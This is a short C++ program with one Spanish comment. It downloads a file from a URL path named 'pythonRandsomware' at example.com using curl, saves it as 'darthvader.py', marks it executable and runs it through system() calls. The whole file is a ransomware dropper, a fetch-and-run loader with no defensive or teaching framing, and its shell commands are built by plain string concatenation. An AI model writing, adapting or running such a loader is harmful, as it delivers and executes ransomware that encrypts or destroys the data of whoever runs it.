#include <iostream>
#include <fstream>
#include <cstdlib>
#include <sys/stat.h>
#include <unistd.h>
#ifdef _WIN32
#include <windows.h>
#endif

void download_script(const std::string& url, const std::string& output_path) {
    std::string command = "curl -o " + output_path + " " + url;
    system(command.c_str());
}

void make_executable(const std::string& file_path) {
#ifdef _WIN32
    // En Windows, no es necesario cambiar los permisos para hacer un archivo ejecutable
#else
    chmod(file_path.c_str(), 0755);
#endif
}

void execute_script(const std::string& file_path) {
#ifdef _WIN32
    std::string command = "python " + file_path;
    system(command.c_str());
#else
    std::string command = "./" + file_path;
    system(command.c_str());
#endif
}

int main() {
    std::string url = "http://example.com/path/to/pythonRandsomware";
    std::string script_path = "darthvader.py";

    download_script(url, script_path);
    make_executable(script_path);
    execute_script(script_path);

    return 0;
}